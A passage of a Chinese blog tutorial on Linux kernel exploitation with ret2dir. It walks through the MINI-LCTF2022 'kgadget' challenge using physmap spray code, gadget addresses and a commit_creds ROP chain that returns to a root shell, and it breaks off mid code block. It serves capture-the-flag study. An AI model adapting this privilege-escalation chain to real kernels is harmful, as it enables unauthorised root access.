+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/1460000044047060.png" class title="image-20230707154728342">
+
+<p>（2）通过大量覆盖<code>phsymap</code>内存的方法，提高命中率。使用堆喷技术，在该内存区填充大量的<code>payload</code>这样既不会影响<code>payload</code>的执行，又能够提高命中<code>payload</code>的可能性，填充效果如下图</p>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/1460000044047061.png" class title="未命名文件 (3)">
+
+<p>在旧版本的内核中<code>phsymap</code>是具有可执行权限的，因此可以在用户空间中填充<code>shellcode</code>，但是如今的内核版本<code>phsymap</code>已经不具备可执行权限了，因此只能在里面填充<code>ROP</code>链</p>
+<h3 id="堆喷"><a href="#堆喷" class="headerlink" title="堆喷"></a>堆喷</h3><p><strong>我们为用户空间所分配的每一张内存页，在内核空间中都能通过这块内存区域访问到</strong>，因此我们只需要在用户空间布置恶意数据，之后再在内核空间的这块区域中找到我们的用户空间数据对应的内核空间地址即可。</p>
+<p>那么现在又出现一个新的问题，**我们如何得知我们布置的恶意数据在内核空间中的对应地址呢？**我们无法进行内核空间中的内存搜索，因此也就无法直接得知我们布置的恶意数据在内核空间中的地址。</p>
+<p><strong>使用 mmap 喷射大量的物理内存写入同样的 payload</strong>，之后再随机挑选一个相对靠近高地址的 direct mapping area 上的地址进行利用，这样我们就<strong>有很大的概率命中到我们布置的 payload 上</strong>。</p>
+<p>代码中可用下述语句获取页大小</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysconf(_SC_PAGESIZE)</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="三、例题：MINI-LCTF2022-kgadget"><a href="#三、例题：MINI-LCTF2022-kgadget" class="headerlink" title="三、例题：MINI-LCTF2022-kgadget"></a>三、例题：MINI-LCTF2022-kgadget</h2><h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260317082948287.png" class title="image-20260317082948287">
+
+<p><code>kgadget.tar</code>解包出来四个文件，分别是内核镜像<code>bzImage</code>、文件系统<code>rootfs.cpio</code>、启动脚本<code>run.sh</code>和一份说明<code>README.md</code></p>
+<p>启动脚本<code>run.sh</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-m 256M \</span><br><span class="line">	-cpu kvm64,+smep,+smap \</span><br><span class="line">	-smp cores=2,threads=2 \</span><br><span class="line">	-kernel bzImage \</span><br><span class="line">	-initrd ./rootfs.cpio \</span><br><span class="line">	-nographic \</span><br><span class="line">	-monitor /dev/null \</span><br><span class="line">	-snapshot \</span><br><span class="line">	-append <span class="string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">	-no-reboot \</span><br><span class="line">	-s  <span class="comment">#为调试新增选项</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>开启了smep、smap</li>
+<li>禁用了kaslr</li>
+</ul>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╭─ ~/workplace/pwn/MINI-LCTF2022-kgadget ▓▒░─────────────────────────────────░▒▓ ✔  at 08:31:02</span><br><span class="line">╰─ file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version 5.10.112 (arttnba3@ubuntu) #1 SMP Thu Apr 21 19:47:35 +08 2022, RO-rootFS, swap_dev 0X9, Normal VGA</span><br></pre></td></tr></table></figure></div>
+
+<p>用传统的<code>extract-vmlinux</code>脚本解不开，使用<code>vmlinux-to-elf</code>提取<code>vmlinux</code></p>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260317085314357.png" class title="image-20260317085314357">
+
+<p>提取<code>cpio</code>文件系统：<code>unpack.sh</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> rootfs</span><br><span class="line"><span class="built_in">cd</span> rootfs</span><br><span class="line"><span class="built_in">cp</span> ../rootfs.cpio .</span><br><span class="line">cpio -idm &lt; ./rootfs.cpio</span><br><span class="line"><span class="built_in">rm</span> rootfs.cpio</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260317085850825.png" class title="image-20260317085850825">
+
+<p>初始化脚本<code>init</code>中，修改权限为<code>root</code>，方便调试</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setsid cttyhack setuidgid 0 sh</span><br><span class="line"><span class="comment"># setsid cttyhack setuidgid 1000 sh</span></span><br><span class="line"><span class="comment"># poweroff -d 0 -f</span></span><br></pre></td></tr></table></figure></div>
+
+<p><code>kgadget.ko</code>就是我们要分析的驱动了</p>
+<h3 id="kgadget-ko驱动分析"><a href="#kgadget-ko驱动分析" class="headerlink" title="kgadget.ko驱动分析"></a><code>kgadget.ko</code>驱动分析</h3><img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260317090828440.png" class title="image-20260317090828440">
+
+<ol>
+<li>当<code>cmd==114514</code>的时候进入执行</li>
+<li>泄露一个栈指针和函数指针</li>
+<li>给予我们写入并执行<code>shellcode</code>的能力</li>
+<li>使用<code>qmemcpy</code>覆写了<code>pt_regs</code>的部分数据，只有<code>r8/r9</code>可用</li>
+</ol>
+<hr>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260317102917751.png" class title="image-20260317102917751">
+
+<p>先测试一下<code>pt_regs</code>情况，由于<code>ioctl</code>触发系统调用的调用号为<code>0x10</code>，故我们如下布置：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">uint64_t</span> try_hit = <span class="number">0xffff888000000000</span> + <span class="number">0x4000</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_state();</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax,   0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   try_hit;&quot;</span>  <span class="comment">//随便找的一个合法地址</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   114514;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>只要确保<code>rdx</code>传入一个有效指针，然后调试。可见确实只有<code>r9</code>\<code>r8</code>可控</p>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260318144904585.png" class title="image-20260318144904585">
+
+<p>接下来我们尝试利用<code>ret2dir</code>手法，即通过大量申请内存，并写入<code>ROP</code>（physmap spray）。</p>
+<h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><p>构造<code>ROP</code>，然后再考虑堆申请数量的问题。用<code>ropper</code>找一些有用的<code>gadgets</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># uname -r</span></span><br><span class="line">5.10.112</span><br></pre></td></tr></table></figure></div>
+
+<p>看下线性映射区位置：<a class="link" target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.10.112/source/Documentation/x86/x86_64/mm.rst">mm.rst - Documentation&#x2F;x86&#x2F;x86_64&#x2F;mm.rst - Linux source code v5.10.112 - Bootlin Elixir Cross Referencer<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260318154103572.png" class title="image-20260318154103572">
+
+<p>由于开启了<code>kpti</code>，需要用<code>swapgs_restore_regs_and_return_to_usermode</code></p>
+<p>借助下述板子</p>
+<pre><code>	rop[0] = POP_RDI + base;
+	rop[1] = 0;
+	rop[2] = prepare_kernel_cred;
+	rop[3] = MOV_RDI_RAX_POP_RBX_MOV_RAX_RDI_POP_RBP + base;
+	rop[4] = 0;
+	rop[5] = 0;
+	rop[6] = commit_creds;
+	rop[7] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMOD + 22 + base;
+	rop[8] = 0;
+	rop[9] = 0;
+	rop[10] = (uint64_t)shell;
+	rop[11] = user_cs;
+	rop[12] = user_rflags;
+	rop[13] = user_sp+8;  // stack balance
+	rop[14] = user_ss;
+</code></pre>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode</span><br><span class="line"><span class="comment"># ffffffff81c00fb0 T swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; p prepare_kernel_cred</span><br><span class="line"><span class="variable">$2</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0xffffffff810c9540 &lt;prepare_kernel_cred&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p commit_creds</span><br><span class="line"><span class="variable">$1</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0xffffffff810c92e0 &lt;commit_creds&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>注意到，<code>rdx</code><strong>指向的地址</strong>存放着<strong>函数指针</strong></p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  const void **v3; // rdx</span><br><span class="line">  void (*v4)(void); // rbx</span><br><span class="line">  ...</span><br><span class="line">  v4 = (void (*)(void))*v3;</span><br><span class="line">  ...</span><br><span class="line">  v4();</span><br><span class="line"> --------</span><br><span class="line">1.从 v3 指向的内存中，取出值（这个值是函数的地址），赋值给 v4</span><br><span class="line">2.调用 v4 指向的函数（相当于执行这个函数)</span><br></pre></td></tr></table></figure></div>
+
+<p>看一下将执行<code>(*rbx)()</code>时的栈偏移情况</p>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260318213337709.png" class title="image-20260318213337709">
+
+<p>从 <code>rdx</code> 找到地址 <code>addr1</code>，<code>addr1</code>存放了一个函数指针（<code>gadget</code>）。此时<code>RIP</code>指向<code>ret</code>指令，所以计算时最后<code>-0x8</code>。上述计算结果，意味着我们要找到一个<code>add rsp, 0xc0; ret</code>的<code>gadgets</code>，能够将<code>rsp</code>控制指向<code>0x88888888</code>，也就是我们可控的位置，从而进入<code>ROP</code></p>
+<p>找一些<code>gadgets</code>：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; gadget_ropper.txt</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260318215323958.png" class title="image-20260318215323958">
+
+<p>列一下数据的地址信息（由于<code>kaslr</code>关了，所以大多地址都是静态不变的）</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81c00fb0	swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">0xffffffff8108c6f0	pop rdi; ret</span><br><span class="line">0xffffffff810c9540	prepare_kernel_cred	</span><br><span class="line">0xffffffff810048ea	push rax; ret;</span><br><span class="line">0xffffffff810c92e0	commit_creds</span><br><span class="line">0xffffffff81488561  add rsp, 0xa8; pop rbx; pop r12; pop rbp; ret;</span><br><span class="line">0xffffffff810001fc  ret;</span><br><span class="line">0xffffffff811483d0  pop rsp; ret;</span><br><span class="line">0xffffffff82a6b700	init_cred</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="渐进构造ROP-physmap-spray"><a href="#渐进构造ROP-physmap-spray" class="headerlink" title="渐进构造ROP + physmap spray"></a>渐进构造ROP + physmap spray</h3><p><code>rdx</code>要指向线性映射区的一个地址，我们要在该区域首地址布置<code>add rsp, val;ret</code>的<code>gadget</code>，从而让<code>rsp</code>迁移到可控的<code>r9</code>数据位置。接下来我们渐进构造<code>ROP</code></p>
+<p>填充首地址为指定<code>gadget</code>，并进行<code>physmap spray</code></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE  0xffffffff81c00fb0UL</span><br><span class="line">#define POP_RDI_RET                                 0xffffffff8108c6f0UL</span><br><span class="line">#define PREPARE_KERNEL_CRED                         0xffffffff810c9540UL</span><br><span class="line">#define PUSH_RAX_RET                                0xffffffff810048eaUL</span><br><span class="line">#define COMMIT_CREDS                                0xffffffff810c92e0UL</span><br><span class="line">#define ADD_RSP_0XA8_POP_RBX_POP_R12_POP_RBP_RET    0xffffffff81488561UL</span><br><span class="line">#define RET											0xffffffff810001fcUL</span><br><span class="line"></span><br><span class="line">int fd;</span><br><span class="line">size_t pagesize;</span><br><span class="line"></span><br><span class="line">void generateROP(size_t *rop)&#123;</span><br><span class="line">    uint idx = 0;</span><br><span class="line">    // add rsp, val</span><br><span class="line">    rop[idx++] = ADD_RSP_0XA8_POP_RBX_POP_R12_POP_RBP_RET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void physmap_spray()&#123;</span><br><span class="line">    pagesize = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    size_t* ROP_buffer = mmap(</span><br><span class="line">        NULL, </span><br><span class="line">        pagesize, </span><br><span class="line">        PROT_READ | PROT_WRITE, </span><br><span class="line">        MAP_ANONYMOUS | MAP_PRIVATE, </span><br><span class="line">        -1, </span><br><span class="line">        0</span><br><span class="line">    );</span><br><span class="line">    generateROP(ROP_buffer);</span><br><span class="line">	for(int i = 0; i &lt; 0x4000; i++)&#123;</span><br><span class="line">        size_t* heap_buffer = mmap(</span><br><span class="line">            NULL, </span><br><span class="line">            pagesize, </span><br><span class="line">            PROT_READ | PROT_WRITE, </span><br><span class="line">            MAP_ANONYMOUS | MAP_PRIVATE, </span><br><span class="line">            -1, </span><br><span class="line">            0</span><br><span class="line">        );</span><br><span class="line">        memcpy(heap_buffer, ROP_buffer, pagesize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>同时让ai添加<code>转换虚拟地址到物理地址的函数</code></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 核心函数：虚拟地址 → 物理地址转换</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">get_physical_address</span><span class="params">(<span class="type">int</span> pid, <span class="type">uint64_t</span> virtual_addr)</span> &#123;</span><br><span class="line">    <span class="type">char</span> pagemap_path[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(pagemap_path, <span class="keyword">sizeof</span>(pagemap_path), <span class="string">&quot;/proc/%d/pagemap&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开pagemap文件（必须root权限）</span></span><br><span class="line">    <span class="type">int</span> pagemap_fd = open(pagemap_path, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (pagemap_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] 打开pagemap失败: %s（需root权限）\n&quot;</span>, strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算pagemap偏移（每个页占8字节）</span></span><br><span class="line">    <span class="type">off_t</span> offset = (virtual_addr / pagesize) * <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (lseek(pagemap_fd, offset, SEEK_SET) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] lseek失败: %s\n&quot;</span>, strerror(errno));</span><br><span class="line">        close(pagemap_fd);</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取8字节pagemap项（二进制数据）</span></span><br><span class="line">    <span class="type">uint64_t</span> pagemap_entry;</span><br><span class="line">    <span class="type">ssize_t</span> bytes_read = read(pagemap_fd, &amp;pagemap_entry, <span class="keyword">sizeof</span>(pagemap_entry));</span><br><span class="line">    close(pagemap_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bytes_read != <span class="keyword">sizeof</span>(pagemap_entry)) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] 读取pagemap失败: %s\n&quot;</span>, strerror(errno));</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// bit63=1表示有物理映射，否则无</span></span><br><span class="line">    <span class="keyword">if</span> (!(pagemap_entry &amp; (<span class="number">1ULL</span> &lt;&lt; <span class="number">63</span>))) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[-] 虚拟地址0x%lx无物理映射\n&quot;</span>, virtual_addr);</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">uint64_t</span>)<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提取物理页框号（PFN），计算物理地址</span></span><br><span class="line">    <span class="type">uint64_t</span> pfn = pagemap_entry &amp; <span class="number">0x7FFFFFFFFFFFFFU</span>LL;</span><br><span class="line">    <span class="keyword">return</span> pfn * pagesize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">generateROP</span><span class="params">(<span class="type">size_t</span> *rop)</span>&#123;</span><br><span class="line">    uint idx = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// add rsp, val</span></span><br><span class="line">    rop[idx++] = ADD_RSP_0XA8_POP_RBX_POP_R12_POP_RBP_RET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">physmap_spray</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> pid = getpid(); <span class="comment">// 获取当前进程ID</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 系统页大小: %ld 字节\n&quot;</span>, pagesize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] 当前进程PID: %d\n&quot;</span>, pid);</span><br><span class="line">    pagesize = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    <span class="type">size_t</span>* ROP_buffer = mmap(</span><br><span class="line">        <span class="literal">NULL</span>, </span><br><span class="line">        pagesize, </span><br><span class="line">        PROT_READ | PROT_WRITE, </span><br><span class="line">        MAP_ANONYMOUS | MAP_PRIVATE, </span><br><span class="line">        <span class="number">-1</span>, </span><br><span class="line">        <span class="number">0</span></span><br><span class="line">    );</span><br><span class="line">    generateROP(ROP_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> total = <span class="number">0x4000</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; total; i++)&#123;</span><br><span class="line">        <span class="type">size_t</span>* heap_buffer = mmap(</span><br><span class="line">            <span class="literal">NULL</span>, </span><br><span class="line">            pagesize, </span><br><span class="line">            PROT_READ | PROT_WRITE, </span><br><span class="line">            MAP_ANONYMOUS | MAP_PRIVATE, </span><br><span class="line">            <span class="number">-1</span>, </span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">memcpy</span>(heap_buffer, ROP_buffer, pagesize);</span><br><span class="line">        <span class="comment">// 打印物理地址（每1000个+最后一个打印）</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">1000</span> == <span class="number">0</span> || i == total - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">uint64_t</span> phys_addr = get_physical_address(pid, (<span class="type">uint64_t</span>)heap_buffer);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] 第 %d 个heap_buffer → 虚拟地址: %p | 物理地址: 0x%lx\n&quot;</span>,</span><br><span class="line">                   i, heap_buffer, phys_addr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260318230339242.png" class title="image-20260318230339242">
+
+<p>大概确定范围了，于是将跳转到的地址大概设为</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> try_hit = <span class="number">0xffff888000000000</span> + <span class="number">0x8000000</span>;</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260318230724485.png" class title="image-20260318230724485">
+
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/image-20260318230818253.png" class title="image-20260318230818253">
+
+<p>成功执行指定<code>gadget</code>，并劫持执行流，接下来继续布局<code>ROP</code>链。现在<code>0x88888888</code>\<code>0x99999999</code>这两个区域的数据是我们可控的，为此我们尝试迁移到刚刚成功进入的线性映射区。接下来进行修改<code>generateROP</code></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 